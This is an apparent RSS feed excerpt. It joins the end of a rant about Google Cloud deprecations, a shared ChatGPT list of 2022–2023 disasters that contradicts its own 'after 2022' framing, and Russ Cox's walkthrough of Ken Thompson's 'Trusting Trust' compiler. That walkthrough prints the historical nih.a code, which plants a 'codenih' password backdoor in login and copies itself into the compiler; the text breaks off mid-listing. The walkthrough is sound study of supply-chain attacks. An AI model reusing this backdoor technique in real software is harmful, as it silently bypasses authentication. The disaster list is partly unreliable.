<em>Android is not Google</em>. They have almost nothing to do with each other. Android is a company that was purchased by Google in July 2005, and that company has been allowed to run more or less autonomously, and in fact has remained largely intact through the intervening years. Android is an infamously hairy tech stack, and a just-as-infamously prickly organization. As one Googler put it, “One does not simply walk into Android.”</p><p id="17a1">I’ve done my share of ranting about how bad some of Android’s early design decisions have been. Heck, at the time I was doing that ranting, they were busy rolling out shit like Instant Apps, which is now (surprise!) <a href="https://android-developers.googleblog.com/2019/04/google-play-instant-feature-plugin.html#:~:text=When%20building%20your%20app%2C%20you,bundle%20as%20soon%20as%20possible." rel="noopener ugc nofollow" target="_blank">deprecated</a>, and haha on you if you were dumb enough to listen to them when they told you to port all your stuff to Instant Apps.</p><p id="f23b">But there’s a difference here, a material difference, which is that the Android folks actually DO understand how important Platforms are, they go <em>well out of their way</em> to prevent breaking your old Android code. In fact, their efforts to keep backward compatibility are so extreme that even I, during my brief stint in Android-land a few years back, found myself trying to convince them to drop support for some of the oldest devices and APIs. (I was wrong, as I’ve been about many other things past and present. Sorry Android folks! Now that I’ve visited Indonesia, I see why we need them.)</p><p id="377f">The Android folks take backwards compatibility to almost unimaginable extremes, which piles on massive amounts of legacy technical debt in their systems and toolchains. Oh boy, you should see some of the crazy stuff they have to do in their build system, all in the name of compatibility.</p><p id="bde0">For this, I award Android the coveted You’re Not Google award. You really don’t want to be Google. They don’t know how to build platforms that can last, whereas Android <em>does</em> know how to do it. And so Google is being very wise in one respect: letting the Android folks do things their way.</p><p id="3ec4">Instant Apps was a pretty dumb idea, though. You know why? Because it required you to <em>rewrite and re-architect your application!</em> As if people are just going to up and rewrite 2 million apps. I’m guessing Instant Apps was probably a Googler’s idea.</p><p id="cef2">But you see the difference here. Backwards compatibility comes with a steep cost, and Android has chosen to bear the burden of that cost, whereas Google insists that <em>you</em>, the paying customer, bear that burden.</p><p id="4d09">You can see Android’s commitment to backwards compatibility in their APIs. It’s a sure sign, when there are four or five different coexisting subsystems for doing literally the same thing, that underlying it all is a commitment to backwards compatibility. Which in the Platforms world, is synonymous with commitment to your customers, and to your marketplace.</p><p id="50ec">Google’s pride in their software engineering hygiene is what gets them into trouble here. They don’t like it when there are lots of different ways to do the same thing, with older, less-desirable ways sitting alongside newer fancier ways. It increases the learning curve for newcomers to the system, it increases the burden of supporting the legacy APIs, it slows down new feature velocity, and the worst sin of all: it’s ugly. Google is like Lady Ascot in Tim Burton’s Alice in Wonderland:</p><p id="f219"><strong>Lady Ascot</strong>: Alice, do you know what I fear most?</p><p id="8b14"><strong>Alice Kingsley</strong>: The decline of the aristocracy?</p><p id="87b2"><strong>Lady Ascot</strong>: <em>Ugly grandchildren</em>.</p><p id="e941">To explore the tradeoff of Pretty vs Practical, let’s take a peek at a third successful platform (after Emacs and Android) and see how it fares: Java itself.</p><p id="0fbb">Java has <em>tons</em> of deprecated APIs. Deprecation is super popular with Java programmers, more so than for most programming languages. Java itself, the core language and libraries, deprecates APIs all the time.</p><p id="f717">To take just one of thousands of examples, <a href="https://docs.oracle.com/en/java/javase/12/docs/api/java.base/java/lang/Thread.html#stop()" rel="noopener ugc nofollow" target="_blank">killing threads</a> is deprecated. It’s been deprecated since Java 1.2, released in December 1998. It’s been 22 years since they deprecated it.</p><p id="2b55">My live production code still kills threads <em>every day</em>. Is that a good thing? Absolutely! I mean, obviously if I were to rewrite the code today I’d do it differently. But my game code, which has been able to make hundreds of thousands of people happy over the past 2 decades, was written to kill worker threads that take too long, and <em>I’ve never had to change it.</em> I know my system best, and I have literally 25 years of experience with running it in production, and I can tell you: In my use case, killing these particular worker threads is <em>harmless</em>. It is not worth it to focus my time and energy on rewriting that code, and praise be unto Larry Ellison (I guess), since Oracle has never made me rewrite it.</p><p id="dd33">I guess Oracle understands Platforms too. Go figure.</p><p id="06d9">You can see evidence all through Java’s core APIs of waves of deprecation, like glacier lines in a canyon. There are easily five or six different keyboard focus managers in Java Swing. In fact it’s hard to find a Java API that isn’t deprecated. But they all still work! I think the only time the Java core team will actually <em>remove</em> an API is if it causes a blatant security problem.</p><p id="d186">Here’s the thing, folks: We software developers are all super busy, and we are also faced with competing alternatives in <em>every</em> software domain. At any given time, programmers in language X are looking at language Y as a possible replacement. Oh, you don’t believe me? What about Swift? Everyone’s migrating *to* Swift, not away from it, right? Oho, how little you know. Businesses are taking a mercenary’s accounting of their dual mobile teams (iOS and Android), and starting to realize that those phony-sounding dog-and-pony-show cross-platform development systems like Flutter and React Native have real teeth, and using them could cut their mobile team sizes in half, or alternately, make them twice as productive. There’s real money at stake here. Yes, there are trade-offs, but on the other hand, mooooooooney.</p><p id="12dc">Let’s say hypothetically that Apple was dumb enough to pull a Guido van Rossum, and declare that Swift 6.0 is backwards-incompatible with Swift 5.0, much in the way that Python 3 is incompatible with Python 2.</p><p id="5064">I probably told this story ten years ago, but about fifteen years ago I was at O’Reilly’s Foo Camp with Guido, sitting in a tent with Paul Graham and a bunch of other at-the-time mucky-mucks, waiting for Larry Page to fly out in his personal helicopter, and Guido was droning on tonelessly in the sweltering heat about “Python 3000”, which he had named in honor of the number of years it would take everyone to migrate to it. We kept asking him why he was breaking compatibility, and he’d answer, “Unicode”. And we’d ask him, hey, if we have to rewrite our code, then what other benefits are we going to see? And he’d answer, “Yoooooooooooooouuuuuuuniiiiiiicoooooooode”.</p><p id="a1d3">If you install the Google Cloud Platform “gcloud” SDK, you’ll get this notice:</p><p id="3fdb"><em>Dear RECIPIENT,</em></p><p id="ec71"><em>We would like to remind you that support for Python 2 is deprecated, so fuuuuuuck yoooooooooooooooooooouuuuuu</em></p><p id="0c3c">…and so on. The Circle of Life.</p><p id="856f">But the thing is, every single developer has choices. And if you make them rewrite their code enough times, some of those <em>other</em> choices are going to start looking mighty appealing. They’re not your hostages, as much as you’d like them to be. They are your guests. Python is still a very popular programming language, to be sure — but <em>golly</em> did Python 3(000) create a huge mess for themselves, their communities, and the <em>users</em> of their communities’ software — one that has been a train-wreck in progress for fifteen years and is still kicking.</p><p id="ed33">How much Python software was rewritten in Go (or Ruby, or some other alternative) because of that backwards incompatibility? How much <em>new</em> software was written in something other than Python, which <em>might</em> have been written in Python if Guido hadn’t burned everyone’s house down? It’s hard to say, but I can tell you, it hasn’t been <em>good</em> for Python. It’s a huge mess and everyone is miserable.</p><p id="4135">So let’s say Apple pulls a Guido and breaks compatibility. What do you think will happen? Well, maybe 80–90% of the developers will rewrite their software, if they’re lucky. Which is the same thing as saying, they’re going to lose 10–20% of their user base to some competing language, e.g. Flutter.</p><p id="a8af">Do that a few times, and you’ve lost half your user base. And like in sports, momentum in the programming world is <em>everything</em>. Anyone who shows up on the charts as “lost half their users in the past 5 years” is being flagged as a Big Fat Loser. You don’t want to be trending down in the Platforms world. But that’s exactly where deprecation — the “removing APIs” kind, not the “warning but permitting” kind — will get you, over time: Trending down. Because every time you shake loose some of your developers, you’ve (a) lost them for good, because they are angry at you for breaking your contract, and (b) given them to your competitors.</p><p id="6886">Ironically, I played a role in helping Google become the deprecation-happy prima donnas that they are today, when I built Grok, which is a source-code understanding engine that facilitates automation and tooling on source code itself — similar to an IDE, but as a cloud-based service that stores materialized representations of Google’s entire multi-billion-line source graph in a big datastore.</p><p id="08aa">Grok provided Googlers with a powerful foundation for doing automated refactorings across the entire code base (literally all of Google). Grok can figure out not just your upstream dependencies (who you depend on), but also your <em>downstream</em> dependencies (who depends on you), so when you change an API, you know everyone you’re breaking! So you can make a change and know that every consumer of your API is being updated to the replacement version; in fact, often, via a tool they wrote called Rosie, you can automate it entirely.</p><p id="1652">This permits Google’s code base internally to be almost preternaturally “clean”, as they have these automated mice scurrying about the house, <em>There Will Come Soft Rains</em>-style, cleaning up the dust balls as they rename SomeDespicablyLongFunctionName to SomeDespicablyLongMethodName because someone decided it was an ugly grandchild and it needed to be euthanized.</p><p id="222b">And honestly it works pretty well for Google… <em>internally</em>. I mean, yes, the Go community within Google does get some good-natured laughs at the expense of the Google Java community over the latter’s habit of gratuitous continuous refactoring. If you keep twiddling with something N times, then it implies that not only did you fuck it up N-1 times, but after a while it’s pretty clear you’ve probably fucked it up on the Nth try as well. But by and large, they stay on top of it, and stuff stays “clean”.</p><p id="4ee1">The problem begins when they take that attitude and try to impose it on their Cloud customers and other API users.</p><p id="e703">I’ve walked you a bit through Emacs, Android, and Java; let’s look at one last successful long-lived platform: The Web itself. Boy, HTTP sure has gone through a lot of iterations since 1995 when we were all using blink tags and under-construction signs in our handwritten HTML pages.</p><p id="0e11">But it still works! And those pages still work! That’s right, folks, browsers are some of the world champions at backwards compatibility. Chrome is another example of a rare Google Platform that has their heads screwed on straight, and, you guessed it, Chrome acts effectively like a separate company from the rest of Google.</p><p id="7203">I’ll also give a shout-out to our friends in the Operating Systems business: Windows, Linux, NOT APPLE FUCK YOU APPLE, FreeBSD, and so on, for doing such a great job of backwards compatibility on their successful platforms. (Apple gets like a C-minus at best, since they break shit all the time for no good reason, but somehow the community papers over it on each release, and so far, containers haven’t completely obsoleted OS X… yet.)</p><p id="02d5">But wait, you say. Aren’t you comparing apples to oranges, with standalone single-machine software systems like Emacs/JDK/Android/Chrome to multi-machine systems and APIs like Clouds?</p><p id="c6fd">Well, I tweeted this yesterday, but as a Larry Wall “sucks/rules”-style yardstick, I searched for “deprecated” on Google and Amazon’s developer sites, respectively, and even though AWS has <em>hundreds</em> more service offerings than GCP, Google’s developer docs mention deprecation around 7x as often.</p><p id="e94d">At this point, if anyone at Google is reading this, they’re probably ready to pull out charts, Donald Trump interview style, showing me how they’re actually doing really well, and that I can’t do unfair comparisons like “deprecation mentions as a function of number of service offerings”.</p><p id="6f3d">But after all these years, Google Cloud is still #3 (I still haven’t written my “<strong>How to Aim For #2 and Miss</strong>” blog post about this), and according to some internal sources, there’s some concern that they may sink to #4 soon.</p><p id="8ada">I don’t have a slam-dunk silver-bullet argument for you here, to “prove” my thesis. All I have are the colorful examples I’ve shared, which I’ve accumulated over 30 years as a developer. I’ve alluded to the deeply philosophical nature of this problem; in a sense, it’s politicized within the software communities. Some folks believe that platform <em>developers</em> should shoulder the costs of compatibility, and others believe that platform <em>users</em> (developers themselves) should bear the costs. It’s really that simple. And isn’t politics always about who has to shoulder costs for shared problems?</p><p id="5e62">So it’s political. And there will be angry responses to this rant.</p><p id="475e">As a <em>user</em> of Google Cloud Platform, and also (at Grab) of AWS for 2 years, I can tell you that there’s a <em>world</em> of difference between the philosophies of Amazon and Google when it comes to priorities. I’m not actively developing on AWS, so I don’t have as much of a sense for how often they sunset APIs that they have previously dangled alluringly before unwitting developers. But I have a suspicion it’s nowhere <em>near</em> as often as happens at Google, and I believe wholeheartedly that this source of constant friction, and frustration, in GCP, is one of the biggest factors holding it back.</p><p id="981e">I know I haven’t gone into a lot of specific details about GCP’s deprecations. I can tell you that virtually everything I’ve used, from networking (legacy to VPC) to storage (Cloud SQL v1 to v2) to Firebase (now Firestore with a totally different API) to App Engine (don’t even get me started) to Cloud Endpoints to… I dunno, <em>everything</em>, has forced me to rewrite it all after at most 2–3 years, and they <em>never</em> automate it for you, and often there is <a href="https://stackoverflow.com/questions/47716433/migrate-from-legacy-network-in-gce" rel="noopener ugc nofollow" target="_blank">no documented migration path</a> at all. It’s just crickets.</p><p id="dff5">And every time, I look over at AWS, and I ask myself what the fuck I’m still doing on GCP. They clearly don’t want customers. They want <em>shoppers</em>. Do you see the difference? Let me show you.</p><p id="1e76">Google Cloud has a <a href="https://cloud.google.com/marketplace" rel="noopener ugc nofollow" target="_blank">Marketplace</a> in which people can offer their software solutions, and in order to avoid the empty-restaurant effect, they had to populate it with some offerings, so they contracted with a company called Bitnami to create a bunch of “click to deploy” solutions, or perhaps I should write “solutions”, because they don’t solve a fucking thing. They’re just there as checkboxes, as marketing filler, and Google never gave a shit whether any of them worked from Day One. I know the PMs who were driving it and I can assure you, those men do not give a shit.</p><p id="e7a5">Take <a href="https://console.cloud.google.com/marketplace/details/click-to-deploy-images/percona" rel="noopener ugc nofollow" target="_blank">click-to-deploy Percona</a>, for instance. I was getting fed up with Google Cloud SQL’s shenanigans, and started looking into setting up my own Percona cluster as an alternative. And for once, Google was going to have done something right, and they were going to save me some time and effort with the click of a button!</p><p id="87a3">Go ahead, I dare you. Follow the link and click the button. Choose “yes” to get all the default parameters and deploy the cluster to your Google Cloud project. Haha, joke’s on you; it doesn’t work. None of that shit works. It’s never tested, starts bit-rotting the minute they roll it out, and it wouldn’t surprise me if over half the click-to-deploy “solutions” (now we understand the air quotes) don’t work <em>at all.</em> It’s a completely embarrassing dark alley that you don’t want to wander down.</p><p id="2f76">But Google is straight-up <em>encouraging</em> you to use it. They want you to <em>buy</em> it. It’s transactional for them. They don’t want to <em>support</em> anything. It’s not part of Google’s DNA. Yes, the engineers support each other, as evidenced by my Bigtable anecdote. But for their customer-facing products and services, they have <em>always</em> been ruthless in <a href="https://killedbygoogle.com/" rel="noopener ugc nofollow" target="_blank">shutting down any offering</a> that doesn’t meet their money bar, even if it has millions of users.</p><p id="6d12">And this presents a real problem for GCP, because that DNA is behind all their Cloud offerings. They aren’t committed to supporting anything; it’s well-known that they refuse to host (as a managed service) any third-party software until <em>after</em> AWS has already done the same thing and built a successful business around it, at which point their customers hold them at gunpoint. But that’s the bar, to get Google to support something.</p><p id="9e2f">This lack of a support culture, combined with a “let’s break it in the name of making it prettier” deprecation treadmill, is alienating their developers.</p><p id="fff6">And that’s not a good thing if you want to build a long-lived platform.</p><p id="a964">Google, wake the fuck up. It’s 2020. You are still losing. It’s time to take a hard look in the mirror and answer for yourselves whether you really want to be in the Cloud business.</p><p id="d4be">If you do, then <strong>stop breaking shit</strong>. You guys are rich. We developers are not. So when it comes to shouldering the burden of compatibility, <em>you need to pay for it.</em> Not us.</p><p id="733a">Because there are at least three other really good Clouds out there. They are beckoning.</p><p id="86a6">And now I’ll get back to trying to fix all my broken stuff. Sigh.</p><p id="4b72">Tune in next time!</p><p id="f0d6"><em>p.s. An update, after having read some of the discussions (which were great, btw). Firebase is not deprecated, nor are there any plans that I know of. However, they have a nasty threading bug that causes the Java client to stop in App Engine, which one of their engineers helped me with </em><strong><em>while I was at Google</em></strong><em>, but they never actually fixed it outright, so I have a crummy workaround to restart my GAE app every day. Four years later! Now they have Firestore, which will take work to migrate to as it’s totally different, and the Firebase bug’s never gonna be fixed. What can we learn from this? You can get help from them </em><strong><em>if you work there</em></strong><em>. It’s frightening that I appear to be the only one using Firebase on GAE, since I’m literally writing fewer than 100 keys in a 100% vanilla app, and it stops working every couple days from an acknowledged bug. What can I tell you, except use it at your own risk. I’m switching to Redis.</em></p><p id="8e96"><em>I’ve also seen some folks more experienced with AWS saying that AWS basically never deprecates/sunsets anything, SimpleDB being a great example. My speculation about AWS not having Google’s deprecation disease seems to have been justified.</em></p><p id="2de3"><em>It was also brought to my attention that 20 days ago, Google’s App Engine team broke a critical Go library hosting service by deprecating and killing a GAE app being run by one of the core Go engineers. Egg on face indeed.</em></p><p id="f0bb"><em>Finally, I’ve heard that Googlers are busy discussing this already, and are by and large agreeing with me (love you guys!)—with the caveat that they seem to think that it’s not fixable because Google’s culture has never had the right incentive structure in place. I think it would be good if I could carve out some time to discuss the absolutely astonishing experience I had working with AWS engineers while I was at Grab. Sometime soon, I hope!</em></p><p id="e508"><em>Oh yeah, and they really did have different species of gummy sharks in a giant self-serve bin in Building 43 in MTV in 2005, hammerhead being my favorite flavor. Larry &amp; Sergey got rid of all the unhealthy snacks by 2006 though. So at the time of my Bigtable story in 2007, there were indeed no gummy sharks and I’m a big fat liar.</em></p><p id="9679"><em>When I looked at Cloud Bigtable 4 years ago (give or take), that was the cost. It seems to have come down a bit, but is still an awful lot for an empty datastore, especially given that my first story shows how inconsequential an empty Bigtable is in their grand scheme.</em></p><p id="3b37"><em>Sorry for offending all the Apple folks, and for not saying enough nice things about Microsoft, etc. I’ve read all the threads online and nobody has said anything unfair, in my opinion. I appreciate all the discussion this has generated! But sometimes you have to make a big splash to kick the discussions off, you know?</em></p><p id="6031"><em>Thanks for reading.</em></p><p id="56cf"><em>Update 2, Aug 19 2020: Stripe does it right! </em><a href="https://stripe.com/blog/api-versioning" rel="noopener ugc nofollow" target="_blank">https://stripe.com/blog/api-versioning</a></p><p id="3423"><em>Update 3, Aug 31 2020: A Google engineer in Cloud Marketplace who happens to be an old friend of mine contacted me to find out why C2D didn’t work, and we eventually figured out that it was because I had committed the sin of creating my network a few years ago, and C2D was failing for legacy networks due to a missing subnet parameter in their templates. I guess my advice to prospective GCP users is to make sure you know a lot of people at Google…</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ChatGPT cut off date now April 2023 (106 pts)]]></title>
            <link>https://chat.openai.com/share/3b088460-86f8-4fa6-afd1-802b7f9a5e9f</link>
            <guid>38022277</guid>
            <pubDate>Thu, 26 Oct 2023 06:14:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chat.openai.com/share/3b088460-86f8-4fa6-afd1-802b7f9a5e9f">https://chat.openai.com/share/3b088460-86f8-4fa6-afd1-802b7f9a5e9f</a>, See on <a href="https://news.ycombinator.com/item?id=38022277">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Here are 10 significant catastrophes that occurred after 2022, up to my knowledge cutoff in April 2023, along with their associated casualties:</p><div><li><p><strong>Earthquake in Turkey and Syria (February 6, 2023):</strong> This devastating earthquake, with a magnitude of 7.8, struck southeastern Turkey and northern Syria, leading to widespread destruction. The death toll exceeded 47,000 people, making it one of the deadliest earthquakes in recent history.</p></li><li><p><strong>Floods in Brazil (January 2023):</strong> Severe floods and landslides hit the state of São Paulo in Brazil, resulting in over 50 deaths. Several cities, including São Sebastião and Ubatuba, were significantly impacted.</p></li><li><p><strong>Train Derailment in Greece (March 1, 2023):</strong> A passenger train and a freight train collided in central Greece, near the city of Larissa, causing the death of at least 57 people.</p></li><li><p><strong>Earthquake in Afghanistan (June 22, 2022):</strong> A powerful earthquake with a magnitude of 5.9 struck eastern Afghanistan, particularly affecting the Paktika and Khost provinces. The catastrophe resulted in the death of over 1,000 people.</p></li><li><p><strong>Floods in Pakistan (Mid-2022):</strong> Monsoon floods in Pakistan, particularly severe in the Sindh and Balochistan provinces, led to the deaths of over 1,000 people and displaced millions.</p></li><li><p><strong>Tornado Outbreak in the United States (March 2023):</strong> A series of tornadoes swept across several states in the U.S., including Mississippi, Alabama, and Georgia. The outbreak caused at least 25 fatalities.</p></li><li><p><strong>Ferry Fire in the Philippines (March 28, 2023):</strong> A fire broke out on a ferry in the Philippines, leading to at least 31 deaths. The incident occurred near the island of Basilan.</p></li><li><p><strong>Typhoon Noru in the Philippines (September 2022):</strong> This powerful typhoon, also known as Karding, caused widespread destruction in the Philippines, resulting in the deaths of at least 8 people.</p></li><li><p><strong>Landslides in Peru (January 2023):</strong> Heavy rains triggered landslides in the Cusco region of Peru, leading to at least 36 deaths. The town of Santa Teresa, near the tourist attraction Machu Picchu, was particularly affected.</p></li><li><p><strong>Cyclone Gabrielle in New Zealand (February 2023):</strong> This powerful cyclone caused significant flooding and landslides in New Zealand's North Island, leading to at least 11 deaths.</p></li></div><p>Please note that the number of casualties and the impact of these catastrophes might have changed after my last update in April 2023.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Running the "Reflections on Trusting Trust" Compiler (214 pts)]]></title>
            <link>https://research.swtch.com/nih</link>
            <guid>38020792</guid>
            <pubDate>Thu, 26 Oct 2023 01:57:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/nih">https://research.swtch.com/nih</a>, See on <a href="https://news.ycombinator.com/item?id=38020792">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>Running the “Reflections on Trusting Trust” Compiler
        
        <div>
        <p>
          
            Posted on Wednesday, October 25, 2023.
            
          
        </p>
        </div>
        </h2>
        


<p>
Supply chain security is a hot topic today, but it is a very old problem.
In October 1983, 40 years ago this week,
Ken Thompson chose supply chain security as the topic for his Turing award lecture,
although the specific term wasn’t used back then.
(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
the “Annual Conference on Computers.”)
Ken’s lecture was later published in <i>Communications of the ACM</i>
under the title “<a href="https://dl.acm.org/doi/pdf/10.1145/358198.358210">Reflections on Trusting Trust</a>.”
It is a classic paper, and a short one (3 pages);
if you haven’t read it yet, you should. This post will still be here when you get back.
</p>

<p>
In the lecture, Ken explains in three steps how to modify a C compiler binary
to insert a backdoor when compiling the “login” program,
leaving no trace in the source code.
In this post, we will run the backdoored compiler using Ken’s actual code.
But first, a brief summary of the important parts of the lecture.
</p>

<a href="https://research.swtch.com/step1"><h2 id="step1">Step 1: Write a Self-Reproducing Program</h2></a>

<p>
Step 1 is to write a program that prints its own source code.
Although the technique was not widely known in 1975,
such a program is now known in computing as a “<a href="https://en.wikipedia.org/wiki/Quine_(computing)">quine</a>”
popularized by Douglas Hofstadter in <i>Gödel, Escher, Bach</i>.
Here is a Python quine, from <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">this collection</a>:
</p>

<pre>s=<span>’s=%r;print(s%%s)’</span>;print(s%s)
</pre>

<p>
And here is a slightly less cryptic Go quine:
</p>

<pre>package main
func main() { print(q + "\x60" + q + "\x60") }
var q = <span>`package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `</span>
</pre>

<p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
In the Python version, the placeholder is <code>%r</code>;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “<a href="https://research.swtch.com/zip">Zip Files All The Way Down</a>,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
</p>

<a href="https://research.swtch.com/step2"><h2 id="step2">Step 2: Compilers Learn</h2></a>

<p>
Step 2 is to notice that when a compiler compiles itself,
there can be important details that persist only in the compiler
binary, not in the actual source code.
Ken gives the example of the numeric values of escape sequences in C strings.
You can imagine a compiler containing code like this during
the processing of escaped string literals:
</p>

<pre>c = next();
if(c == '\\') {
    c = next();
    if(c == 'n')
        c = '\n';
}
</pre>

<p>
That code is responsible for processing the two character sequence <code>\n</code>
in a string literal
and turning it into a corresponding byte value,
specifically <code>’\n’</code>.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write <code>return 10</code>,
you compile and install the compiler, and <i>then</i> you can change
the code to <code>return ’\n’</code>.
The compiler has “learned” the value of <code>’\n’</code>,
but that value only appears in the compiler binary,
not in the source code.
</p>

<a href="https://research.swtch.com/step3"><h2 id="step3">Step 3: Learn a Backdoor</h2></a>

<p>
Step 3 is to put these together to help the compiler “learn”
to miscompile the target program (<code>login</code> in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
</p>

<ol>
<li>Recognize <code>login</code> and insert the backdoor.
</li><li>Recognize the compiler itself and insert the code for these two changes.
</li></ol>

<p>
The “insert the code for these two changes” step requires being able to write
a self-reproducing program: the code must reproduce itself
into the new compiler binary.
At this point, the compiler binary has “learned” the miscompilation steps,
and the clean source code can be restored.
</p>

<a href="https://research.swtch.com/run"><h2 id="run">Running the Code</h2></a>

<p>At the Southern California Linux Expo in March 2023,
Ken gave the closing keynote,
<a href="https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643">a delightful talk</a>
about his 75-year effort accumulating what must be the world’s
largest privately held digital music collection,
complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
During the Q&amp;A session, someone <a href="https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284">jokingly asked</a> about the Turing award lecture, specifically
“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”
Ken replied:
</p>

<blockquote>
I assume you’re talking about some paper I wrote a long time ago.
No, I have no backdoor.
That was very carefully controlled, because there were some spectacular fumbles before that.
I got it released, or I got somebody to steal it from me, in a very controlled sense,
and then tracked whether they found it or not.
And they didn’t.
But they broke it, because of some technical effect,
but they didn’t find out what it was and then track it.
So it never got out, if that’s what you’re talking about.
I hate to say this in front of a big audience, but
the one question I’ve been waiting for since I wrote that paper is
“you got the code?”
Never been asked.
I still have the code.
</blockquote>

<p>Who could resist that invitation!?
Immediately after watching the video on YouTube in September 2023,
I emailed Ken and asked him for the code.
Despite my being six months late, he said I was the first person to ask
and mailed back an attachment called <code>nih.a</code>,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today, <code>.a</code> files are archives containing
compiler object files,
but this one contains two source files.</p>

<p>
The code applies cleanly to the C compiler from the
<a href="https://en.wikipedia.org/wiki/Research_Unix">Research Unix Sixth Edition (V6)</a>.
I’ve posted an online emulator that runs V6 Unix programs
and populated it with some old files from Ken and Dennis,
including <code>nih.a</code>.
Let’s actually run the code.
You can <a href="https://research.swtch.com/v6">follow along in the simulator</a>.</p>


<table>
<tbody><tr>
<td>
<p>Login as <code>ken</code>, password <code>ken</code>.<br>
(The password is normally not shown.)
</p></td><td><pre>login: <b>ken</b>
Password: <b>ken</b>

% <b>who</b>
ken     tty8 Aug 14 22:06
%
</pre>
</td></tr><tr>
<td>
<p>Change to and list the <code>nih</code> directory,<br>
discovering a Unix archive.
</p></td><td><pre>% <b>chdir nih</b>
% <b>ls</b>
nih.a
</pre>
</td></tr><tr>
<td>
<p>Extract <code>nih.a</code>.
</p></td><td><pre>% <b>ar xv nih.a</b>
x x.c
x rc
</pre>
</td></tr><tr>
<td>
<p>Let’s read <code>x.c</code>, a C program.
</p></td><td><pre>% <b>cat x.c</b>
</pre>
</td></tr><tr>
<td>
<p>Declare the global variable <code>nihflg</code>,<br>
of implied type <code>int</code>.
</p></td><td><pre>nihflg;
</pre>
</td></tr><tr>
<td>
<p>
Define the function <code>codenih</code>, with implied<br>
return type <code>int</code> and no arguments.<br>
The compiler will be modified to call <code>codenih</code><br>
during preprocessing, for each input line.
</p></td><td><pre>codenih()
{
    char *p,*s;
    int i;
</pre>
</td></tr><tr>
<td>
<p><code>cc -p</code> prints the preprocessor output<br>
instead of invoking the compiler back end.<br>
To avoid discovery, do nothing when <code>-p</code> is used.<br>
The implied return type of <code>codenih</code> is <code>int</code>,<br>
but early C allowed omitting the return value.
</p></td><td><pre>    if(pflag)
        return;
</pre>
</td></tr><tr>
<td>
<p>Skip leading tabs in the line.
</p></td><td><pre>    p=line;
    while(*p=='\t')
        p++;
</pre>
</td></tr><tr>
<td>
<p>Look for the line<br>
“<code>name = crypt(pwbuf);</code>” from <a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a>.<br>
If not found, jump to <code>l1</code>.
</p></td><td><pre>    s="namep = crypt(pwbuf);";
    for(i=0;i&lt;21;i++)
        if(s[i]!=p[i])
            goto l1;
</pre>
</td></tr><tr>
<td>
<p>Define <code>login</code> backdoor code <code>s</code>, which does:<br>
Check for the password “<code>codenih</code>”.<br>
If found, modify <code>namep</code> and <code>np</code><br>
so that the code that follows in <br>
<a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a> will accept the password.
</p></td><td><pre>    p=+i;
    s="for(c=0;c&lt;8;c++)"
      "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"
      "while(*namep)namep++;"
      "while(*np!=':')np++;x1x:";
</pre>
</td></tr><tr>
<td>
<p>With the <code>p=+i</code> from above,<br>
this is: <code>strcpy(p+i, s); return;</code>,<br>
appending the backdoor to the line.<br>
In early C, <code>+=</code> was spelled <code>=+</code>.<br>
The loop is <code>strcpy</code>, and <code>goto l4</code><br>
jumps to the end of the function.
</p></td><td><pre>    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>No match for <code>login</code> code. Next target:<br>
the distinctive line “<code>av[4] = "-P";</code>”<br>
from <a href="https://research.swtch.com/cc.c#av4">cc.c</a>. If not found, jump to <code>l2</code>.
</p></td><td><pre>l1:
    s="av[4] = \"-P\";";
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l2;
</pre>
</td></tr><tr>
<td>
<p>Increment <code>nihflg</code> to 1 to remember<br>
evidence of being in <code>cc.c</code>, and return.
</p></td><td><pre>    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>
Next target: <a href="https://research.swtch.com/cc.c#getline">input reading loop in <code>cc.c</code></a>,<br>
but only if we’ve seen the <code>av[4]</code> line too:<br>
the text “<code>while(getline()) {</code>”<br>
is too generic and may be in other programs.<br>
If not found, jump to <code>l3</code>.
</p></td><td><pre>l2:
    if(nihflg!=1)
        goto l3;
    s="while(getline()) {";
    for(i=0;i&lt;18;i++)
        if(s[i]!=p[i])
            goto l3;
</pre>
</td></tr><tr>
<td>
<p>
Append input-reading backdoor: call <code>codenih</code><br>
(this very code!) after reading each line.<br>
Increment <code>nihflg</code> to 2 to move to next state.
</p></td><td><pre>    p=+i;
    s="codenih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>Next target: <a href="https://research.swtch.com/cc.c#fflush">flushing output in <code>cc.c</code></a>.
</p></td><td><pre>l3:
    if(nihflg!=2)
        goto l4;
    s="fflush(obuf);";
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l4;
</pre>
</td></tr><tr>
<td>
<p>Insert end-of-file backdoor: call <code>repronih</code><br>
to reproduce this very source file<br>
(the definitions of <code>codenih</code> and <code>repronih</code>)<br>
at the end of the now-backdoored text of <code>cc.c</code>.
</p></td><td><pre>    p=+i;
    s="repronih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
l4:;
}
</pre>
</td></tr><tr>
<td>
